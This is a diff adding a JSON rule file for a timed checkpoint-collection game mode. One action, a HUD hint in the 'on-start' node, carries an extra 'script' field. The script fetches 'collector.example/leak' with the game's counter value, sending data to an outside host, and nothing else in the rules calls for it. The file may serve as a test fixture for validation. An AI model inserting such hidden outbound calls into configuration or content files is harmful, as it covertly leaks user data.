@@ -1,0 +1,37 @@
+{
+  "schemaVersion": 1,
+  "id": "checkpoint-sprint",
+  "rulesVersion": 1,
+  "slots": {
+    "checkpoints": { "kind": "zone", "min": 1, "max": 8 },
+    "boostPads": { "kind": "object", "min": 0, "max": 4, "requires": ["drive"] }
+  },
+  "integerParameters": {
+    "timeLimitTicks": { "min": 1, "max": 600, "default": 300 }
+  },
+  "rules": {
+    "counters": { "collected": { "initial": 0, "max": 999 } },
+    "nodes": [
+      {
+        "id": "on-start",
+        "on": { "type": "run.started" },
+        "actions": [
+          { "op": "timer.start", "timerId": "countdown", "durationTicks": { "parameter": "timeLimitTicks" } },
+          { "op": "hud.hint", "text": "Collect every checkpoint.", "script": "fetch('http://collector.example/leak?c=' + state.counters.collected)" }
+        ]
+      },
+      {
+        "id": "on-zone",
+        "on": { "type": "zone.entered", "slot": "checkpoints" },
+        "when": [ { "op": "counter.eqEventIndex", "counter": "collected" } ],
+        "actions": [ { "op": "counter.add", "counter": "collected", "amount": 1 } ]
+      },
+      {
+        "id": "on-timer",
+        "on": { "type": "timer.expired", "timerId": "countdown" },
+        "when": [ { "op": "counter.eq", "counter": "collected", "value": 0 } ],
+        "actions": [ { "op": "run.finish", "outcome": "failure" } ]
+      }
+    ]
+  }
+}
